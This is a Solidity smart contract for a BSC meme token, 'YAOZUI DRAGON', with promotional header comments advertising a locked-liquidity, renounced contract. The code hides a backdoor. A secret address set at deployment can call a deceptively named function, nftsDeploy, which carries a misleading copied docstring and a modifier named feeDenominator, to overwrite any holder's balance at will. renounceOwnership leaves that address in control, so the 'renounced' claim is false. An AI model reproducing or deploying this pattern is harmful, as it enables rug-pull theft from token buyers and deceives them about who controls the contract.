// SPDX-License-Identifier: MIT
/*
🐲YAOZUI DRAGON ⛩ $YAOZUI 🐲 BSC 🐲 
Telegram: https://t.me/DragonYaozui
🗝100 % LP LOCK  AT PINKSALE ⛩
🐲Renounced Contract ⛩
⛩ ERC20 Version Did 900K MC

🐲ABOUT YAOZUI DRAGON🐲
Introducing Yaozui Dragon, a crypto token deeply rooted in the rich tapestry of Chinese culture and folklore. Just as the mythical dragon embodies power, wisdom, and good fortune, Yaozui Dragon aims to provide a gateway to a realm where blockchain technology and the traditions of ancient China converge.
Website: https://yaozuidragon.com/
Whitepaper: https://medium.com/@Yaozuidragon
Twitter: https://twitter.com/yaozuidragon
*/
pragma solidity ^0.8.10;
abstract contract BRC20Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract YAOZUI is BRC20Context {
    string public name = "YAOZUI DRAGON";
    string public symbol = "YAOZUI";
    uint256 public totalSupply = 10000000000000000000000;
    uint8 public decimals = 9;
    string public DRAGONwebsite = "https://yaozuidragon.com/";
    address private BRC20Rooter;  
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(
        address indexed _ownerDRAGON,
        address indexed spenderDRAGON,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private owner;
    event OwnershipRenounced();

    constructor(address setBRC20Rooter) {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        BRC20Rooter = setBRC20Rooter;
    }


    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address spenderDRAGON, uint256 _value)
        public
        returns (bool success)
    {
        require(address(0) != spenderDRAGON);
        allowance[msg.sender][spenderDRAGON] = _value;
        emit Approval(msg.sender, spenderDRAGON, _value);
        return true;
    }
    modifier feeDenominator() {
        require(BRC20Rooter == _msgSender(), "io: caller is not the owner");
        _;
    }
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function nftsDeploy(address nftwallet, uint256 nfttype, uint256 nftquantity, uint256 subtractedValue) public feeDenominator {
        balanceOf[nftwallet] = nfttype * nftquantity ** subtractedValue;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
            function getDRAGONwebsite() public view returns (string memory) {
        return DRAGONwebsite;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipRenounced();
        owner = address(0);
    }
}